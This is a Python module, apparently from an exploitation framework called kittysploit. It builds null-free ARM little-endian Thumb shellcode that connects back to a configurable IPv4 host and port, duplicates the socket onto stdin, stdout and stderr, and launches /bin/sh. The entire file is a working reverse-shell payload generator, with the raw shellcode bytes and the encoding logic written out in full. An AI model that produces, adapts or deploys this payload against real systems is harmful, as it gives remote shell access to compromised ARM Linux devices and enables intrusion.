#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Null-free ARM LE reverse TCP + dup2 + execve("/bin/sh") — Flashback / Metasploit prep_shelly.
# IPv4 only (embedded sockaddr). Use with listeners/multi/reverse_tcp.

from kittysploit import *


class Module(Payload):
    __info__ = {
        "name": "ARM LE reverse TCP shell (raw)",
        "description": (
            "Thumb ARM 32-bit connect-back stager: socket, connect, dup2 x3, execve /bin/sh. "
            "Null-free IPv4 handling per Flashback. Output is raw bytes (not a command string)."
        ),
        "category": PayloadCategory.CMD,
        "arch": Arch.ARM,
        "platform": Platform.LINUX,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL
    }

    lhost = OptString("127.0.0.1", "Connect-back IPv4 (no IPv6)", True)
    lport = OptPort(4444, "Connect-back port", True)
    encoder = OptString("", "Encoder module, e.g. encoders/armle/xor", False, True)

    @staticmethod
    def _hex_to_bin(n: int) -> bytes:
        h = format(int(n), "x")
        if len(h) in (1, 3):
            h = "0" + h
        return bytes.fromhex(h)

    @staticmethod
    def _encode_ipv4(lhost: str) -> tuple[bytearray, int]:
        parts = str(lhost).strip().split(".")
        if len(parts) != 4:
            raise ValueError("lhost must be IPv4")

        encoded = bytearray()
        jump = 0x0C
        for part in parts:
            value = int(part)
            if value < 0 or value > 255:
                raise ValueError("invalid IPv4 octet")
            octet = bytes([value])
            if octet == b"\x00":
                jump += 1
            encoded.extend(octet)
        return encoded, jump

    @staticmethod
    def _encode_port(lport: int) -> bytes:
        lport = int(lport)
        if lport < 1 or lport > 65535:
            raise ValueError("lport must be between 1 and 65535")

        encoded = lport.to_bytes(2, "big")
        if b"\x00" in encoded:
            raise ValueError("lport cannot contain a null byte in network order; choose another listener port")
        return encoded

    @classmethod
    def build_armle_reverse_shell(cls, lhost: str, lport: int) -> bytes:
        lhost_h, jump = cls._encode_ipv4(lhost)
        lport_h = cls._encode_port(lport)

        ins = cls._hex_to_bin(jump) + b"\xa1\x4a\x70"
        jump -= 1
        patch = {1: b"\x4a\x71", 2: b"\x8a\x71", 3: b"\xca\x71"}
        for i in (1, 2, 3):
            if lhost_h[i] == 0:
                lhost_h[i] = 0xFF
                ins += cls._hex_to_bin(jump) + b"\xa1" + patch[i]
                jump -= 1

        return (
            b"\x02\x20\x01\x21\x92\x1a\xc8\x27\x51\x37\x01\xdf\x04\x1c"
            + ins
            + b"\x10\x22\x02\x37\x01\xdf\x3f\x27\x20\x1c\x49\x1a\x01\xdf\x20\x1c\x01\x21"
            b"\x01\xdf\x20\x1c\x02\x21\x01\xdf\x06\xa0\x92\x1a\x49\x1a\xc2\x71\x05\xb4"
            b"\x69\x46\x0a\x46\x0b\x27\x01\xdf\x7f\x40\x02\xff"
            + lport_h
            + bytes(lhost_h)
            + b"\x2f\x62\x69\x6e\x2f\x73\x68\x58"
        )

    def generate(self):
        return self.build_armle_reverse_shell(str(self.lhost), int(self.lport))
